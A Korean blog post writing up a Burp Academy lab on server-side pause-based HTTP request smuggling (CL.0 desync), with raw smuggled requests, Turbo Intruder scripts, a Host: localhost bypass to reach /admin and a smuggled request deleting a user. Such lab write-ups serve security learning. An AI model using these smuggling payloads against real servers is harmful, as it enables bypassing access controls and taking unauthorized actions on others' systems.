---
layout: post
title: "Burp Academy-HTTP Request Smuggling 관련 취약점: Server-side pause-based request smuggling"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, HTTP Request Smuggling]
toc: true
last_modified_at: 2024-03-18 21:00:00 +0900
---

# 개요
- HTTP Request Smuggling 취약점 문제이다. 여기서부터는 웹 브라우저로 공격가능한 요청 스머글링 패턴을 다룬다.
- 이는 2022년 8월에 발표된 James Kettle의 [Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling](https://portswigger.net/research/browser-powered-desync-attacks)에 기초한 내용이다. 
- HTTP Request Smuggling 취약점 문제 19번부터 21번까지 네 개 문제는 이와 관련된 내용이다.
- 문제 주소: https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling
- 취약점 설명페이지(개요): https://portswigger.net/web-security/request-smuggling/browser
- 취약점 설명페이지(Pause-based desync 상세): https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync
- 난이도: EXPERT (어려움)


# 취약점 개요 (Server-side pause-based desync)

이 테크닉은 다음 조건에 의존한다:
- 프론트 엔드 서버는 각 바이트를 즉각적으로 백엔드 서버에 전송한다. (즉, 스트리밍한다. HTTP요청의 모든 내용이 도착할 때까지 기다리지 않는다.)
- 프론트 엔드 서버는 백엔드 서버보다 먼저 타임아웃되지 않는다. 
- 백엔드 서버는 읽기 타임아웃이 발생한 후에도 커넥션을 (재사용을 위해) 오픈된 상태로 둔다.

이 테크닉이 어떻게 동작하는지 다음의 전형적인 CL.0 요청을 살펴보자. 

```http
POST /example HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: x
```

취약한 사이트에 헤더를 보내고, 바디 부분을 보내기전에 멈춘다면(paused) 어떤 일이 벌어질까 생각해보자. 

1. 프론트 엔드는 헤더를 백엔드에 보내고, CL헤더에 적혀진 양만큼의 나머지 바이트가 도착할 때까지 기다린다. 
2. 잠시 뒤, 백엔드에서 타임아웃이 발생하고 응답을 회신한다. (요청 중에서 일부분만 처리된 상태이다.) 이 시점에서, 프론트엔드 서버는 응답을 읽거나 혹은 읽지 않을 수도 있고, 그 것을 우리쪽(유저쪽)으로 보낸다. 
3. 우리가 마침내 바디를 보낸다. (기본적인 스머글링 prefix 부분을 보낸다.)
4. 프론트엔드 서버는 이 것이 처음 요청에서 이어지는 부분이라고 판단, 동일한 커넥션으로 백엔드에서 전송한다. 
5. 백엔드 서버는 처음 요청에 대해서는 이미 응답했기 때문에, 이 것을 새로운 요청으로 인식한다. 

=> CL.0 와 비슷한 상황이다. 프론트엔드 서버와 백엔드 서버사이의 커넥션을 오염시켰다. 
=> 참고로, 서버가 요청을 어플리케이션에 전달하는 경우보다 자신이 직접 응답을 회신하는 경우 더욱 취약한 경향이 있다고 한다. 

# pause-based CL.0 테스트하기
- Burp Repeater로도 테스트할 수 있지만 사용할 수 있는 케이스가 제한된다. (프론트 엔드 서버가 백엔드 서버의 타임아웃 응답을 바로 클라이언트쪽으로 보내주는 경우에 한한다.)
- 따라서 Turbo Intruder를 추천한다. 이를 사용하면 mid-request를 멈춘 후에 서버로부터 응답을 받았는지에 관계없이 재개하는 등의 조작을 할 수 있다. 

순서는 다음과 같다. 

1. Burp Repeater에서 CL.0 probe 요청을 만들고, Turbo Intruder로 보낸다. 

```
POST /example HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: x
```

2. Turbo Intruder의 Python 에디터 패널에서 요청 엔진의 설정(파라메터 값)을 다음과 같이 바꾼다. 

```py
concurrentConnections=1
requestsPerConnection=100
pipeline=False
```

3. 요청을 큐(Queue)에 넣고, 다음 인수를 queue()인터페이스 전달한다. 
- pauseMarker: Turbo Intruder에게 언제 pause를 할지 알려주는 마커이다. 예를들어 특정 문자열을 넣으면 그 문자열을 만났을 때 멈춘다. 
- pauseTime: 얼마나 멈출 건지 밀리세컨드로 지정할 수 있다. 

다음과 같다. 

```py
engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=60000)
```

4. 일반적인 뒤따르는 요청을 큐에 넣는다.

```py
followUp = 'GET / HTTP/1.1\r\nHost: vulnerable-website.com\r\n\r\n'
engine.queue(followUp)
```

5. 결과 테이블에 모든 응답을 넣도록 한다. 

```py
def handleResponse(req, interesting):
    table.add(req)
```

공격을 수행하면 처음에는 아무런 결과도 보이지 않는다. 그러나 지정한 대기 시간만큼 기다리면 두 개의 결과를 볼 수 있다. 두번째 요청에 대한 응답이 기대하는 응답과 같다면(이 경우에는 404응답), 스머글링에 성공했을 가능성이 매우 높다고 볼 수 있다. 


# 랩 개요
- 이 랩은 pause-based 서버 사이드 요청 스머글링에 취약하다. 
- 프론트 엔드 서버는 요청을 백엔드서버에게 스트림으로 보내고, 백엔드 서버는 몇몇 엔드포인트에서 타임아웃이 발생한 후에도 커넥션을 닫지 않는다. 
- 랩을 풀려면 pause-based CL.0 desync가 가능한 벡터를 식별하고, 백엔드 서버로 요청을 스머글링해서 admin패널에 접근, carlos 유저를 삭제하면 된다. 

```
This lab is vulnerable to pause-based server-side request smuggling. The front-end server streams requests to the back-end, and the back-end server does not close the connection after a timeout on some endpoints.

To solve the lab, identify a pause-based CL.0 desync vector, smuggle a request to the back-end to the admin panel at /admin, then delete the user carlos.

Note
Some server-side pause-based desync vulnerabilities can't be exploited using Burp's core tools. You must use the Turbo Intruder extension to solve this lab.
```

# 풀이 
1. 랩을 살펴본다. 

/admin 에 대한 응답은 403 Forbidden이다. 접근제어가 되어 있는 것을 알 수 있다. 

![](/images/burp-academy-hrs-21-1.png)

/resource/로 요청하면 404응답이 돌아온다. 

![](/images/burp-academy-hrs-21-2.png)

/resource로 요청하면 302 리다이렉트응답이 돌아온다. 서버측 리다이렉트가 되는 곳은 스머글링이 될 가능성이 높다. 또한, 친절하게 서버와 버전을 알려주고 있다. [여기](https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-66/version_id-782030/Apache-Http-Server-2.4.52.html)를 보면 `Apache/2.4.52`는 HTTP 요청 스머글링 취약점이 다수 존재한다는 것을 알 수 있다. 이 중에서도 `CVE-2023-25690`가 이번 랩에 존재하는 것 같다. 

![](/images/burp-academy-hrs-21-3.png)

2. 다음과 같이 Turbo Intruder를 세팅한다. 
- Connection헤더를 keep-alive로 준다.
- `Content-Length` 헤더를 `content-length`로 바꿨다. 바꾸지 않고 요청을 보내면 `Content-Length` 값이 0으로 바껴서 보내진다. 서버측에서도 즉각 결과를 준다.  `content-length`로 바꿔서 보내면 값이 업데이트되지 않고 보내진다.

```py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=60000)
    followUp = 'GET /admin/ HTTP/1.1\r\nHost: 0ace005c047a8f7493536f750072005a.web-security-academy.net\r\n\r\n'
    engine.queue(followUp)

def handleResponse(req, interesting):
    table.add(req)
```

![](/images/burp-academy-hrs-21-4.png)

3. 공격결과는 다음과 같다. 대기시간이 4분가까이 됐다. 

POST /resources/에 대한 응답은 null이었다. 

![](/images/burp-academy-hrs-21-5.png)

/admin 에 대한 응답은 여전히 403이었다. 

![](/images/burp-academy-hrs-21-6.png)

4. 모르겠다. 커뮤니티 답을 본다. 

답에서는 Turbo Intruder에 보내는 값이 다음과 같이 되어 있었다. 

http 요청은 다음과 같이 스머글링 요청을 포함한 요청으로 되어 있다. 

```http
POST /resources HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: CORRECT

GET /admin/ HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

```py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=500,
                           pipeline=False
                           )

    engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=61000)
    engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

5. 답대로 설정해본다. 

스머글링 요청 

```http
POST /resources HTTP/1.1
Host: 0ace005c047a8f7493536f750072005a.web-security-academy.net
Cookie: session=ySyYZqiST7hYQjTbhymPN7FvFroZOket
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Content-Length: 89

GET /admin/ HTTP/1.1
Host: 0ace005c047a8f7493536f750072005a.web-security-academy.net


```

Turbo Intruder

```py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=61000)
    engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

6. 공격결과는 다음과 같다. 이번에는 성공했다. 두번째 요청(일반요청)의 응답이 `401 Unauthorized`가 돌아왔다! 이 응답 페이지의 HTML에는 `Admin interface only available to local users`라는 메세지가 적혀 있다. 

![](/images/burp-academy-hrs-21-7.png)


7. 이제 exploit을 시작할 차례다. 공격용 요청을 다음과 같이 바꾼다. `/admin/`에 접근하는 Host헤더의 값을 localhost로 바꿨다. 

```http
POST /resources HTTP/1.1
Host: 0ace005c047a8f7493536f750072005a.web-security-academy.net
Cookie: session=ySyYZqiST7hYQjTbhymPN7FvFroZOket
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Content-Length: 89

GET /admin/ HTTP/1.1
Host: localhost


```

8. Turbo Intruder에서 다시한번 보내본다. 61초후에 다음과 같은 응답이 돌아온다. admin 패널에 접근성공해 200응답이 돌아왔고, 유저를 삭제할 수 있는 form이 확인된다. CSRF토큰도 포함되어 있다. CSRF토큰을 어딘가에 복사해둔다. 

![](/images/burp-academy-hrs-21-8.png)

9. Turbo Intruder에서 유저를 삭제하는 요청을 스머글링하도록 요청을 변경한다. 다음과 같다. Content-Length 값은 직접 바디부분을 카피해서 Repeater의 Inspector등을 사용해서 길이를 확인한다. 확인해본다 스머글링 요청의 바디는 53바이트, 첫번째 요청의 바디는 159바이트였다. 

```http
POST /resources HTTP/1.1
Host: 0ace005c047a8f7493536f750072005a.web-security-academy.net
Cookie: session=ySyYZqiST7hYQjTbhymPN7FvFroZOket
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Content-Length: 159

POST /admin/delete/ HTTP/1.1
Host: localhost
Content-Type: x-www-form-urlencoded
Content-Length: 53

csrf=YfEciSEq9YIzaWiaSlkbdcfefMhf9hxR&username=carlos
```

Turbo Intruder가 스머글링 요청에서도 Pause되는 것을 막기 위해 pauseMaker의 값을 `Content-Length: 159\r\n\r\n`로 변경한다. 이렇게 하면 처음 요청에서만 puase될 것이다.

```py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    engine.queue(target.req, pauseMarker=['Content-Length: 159\r\n\r\n'], pauseTime=61000)
    engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

10. 값을 보내본다. 61초기다리면, 유저가 삭제되었다는 302응답이 확인된다. 

![](/images/burp-academy-hrs-21-9.png)

문제가 풀렸다는 메세지가 출력된다. 

![](/images/burp-academy-hrs-21-success.png)